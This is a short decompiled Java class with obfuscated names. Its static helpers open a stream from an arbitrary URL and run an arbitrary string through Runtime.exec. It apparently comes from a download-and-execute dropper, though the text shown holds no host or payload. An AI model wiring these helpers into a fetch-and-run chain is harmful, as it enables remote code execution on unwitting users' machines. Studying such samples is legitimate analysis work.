// 
// Decompiled by Procyon v0.5.30
// 

package cdea;

import java.net.URL;
import java.io.InputStream;

public class Cio
{
    public static Runtime getRT() {
        return Runtime.getRuntime();
    }
    
    public static InputStream createIS(final String sdhds) throws Exception {
        final URL url = new URL(sdhds);
        return url.openStream();
    }
    
    public static void exe(final String fn) throws Exception {
        getRT().exec(fn);
    }
}
